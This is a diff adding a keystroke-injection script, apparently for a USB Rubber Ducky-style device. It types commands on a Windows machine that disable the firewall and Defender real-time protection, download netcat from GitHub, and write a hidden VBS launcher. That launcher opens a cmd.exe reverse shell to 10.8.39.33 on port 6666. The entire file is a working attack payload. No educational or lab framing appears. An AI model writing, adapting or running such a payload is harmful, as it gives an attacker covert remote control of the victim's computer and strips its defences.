@@ -1,0 +1,39 @@
+GUI r
+DELAY 2000
+STRING powershell Start-Process powershell -Verb runAs
+CTRL SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 2000
+STRING netsh advfirewall set allprofiles state off
+ENTER
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+STRING cd /
+ENTER
+STRING mkdir win
+ENTER
+STRING cd win
+ENTER
+STRING echo (wget 'https://github.com/int0x33/nc.exe/raw/master/nc64.exe' -OutFile a.exe) > b.PS1
+ENTER
+STRING powershell -ExecutionPolicy ByPass -File b.ps1
+ENTER
+STRING echo 'set WshShell = CreateObject("WScript.Shell")' > C:\win\a.vbs
+ENTER
+STRING echo 'WshShell.Run "C:\win\a.exe 10.8.39.33 6666 -e cmd.exe -d", 0' >> C:\win\a.vbs
+ENTER
+STRING exit
+ENTER
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+CTRL SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 500
+STRING START C:\win\a.vbs
+ENTER
+STRING exit
+ENTER
